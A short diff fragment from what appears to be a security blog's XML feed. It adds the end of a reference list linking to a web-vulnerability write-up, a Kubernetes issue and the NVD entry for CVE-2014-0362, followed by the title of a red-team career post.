+  &lt;li&gt;&lt;a href=&quot;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&quot;&gt;https://insinuator.net/2016/03/classical-web-vulns-found-in-google-search-appliance-7-4/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&quot;&gt;https://github.com/kubernetes/kubernetes/issues/57760#issuecomment-356466614&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&quot;&gt;https://nvd.nist.gov/vuln/detail/CVE-2014-0362&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</content>
+ </entry>
  
  <entry>
    <title>從資安麻瓜到紅隊演練專家－Vtim</title>
